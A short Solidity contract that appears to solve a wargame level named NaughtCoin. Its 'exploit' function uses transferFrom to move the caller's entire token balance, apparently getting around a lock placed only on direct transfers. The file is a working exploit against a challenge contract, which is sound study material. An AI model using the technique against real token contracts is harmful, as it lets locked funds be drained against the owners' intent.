// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface INaughtCoin {
    function approve(address _spender, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256);
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);
}

contract NaughtCoin {
    INaughtCoin naughtCoinInstance;

    constructor(address _instanceAddress) {
        naughtCoinInstance = INaughtCoin(_instanceAddress);
    }

    function exploit(address _to) external {
        bool success = naughtCoinInstance.transferFrom(msg.sender, _to, naughtCoinInstance.balanceOf(msg.sender));
        require(success, "Failed to transfer");
    }
}
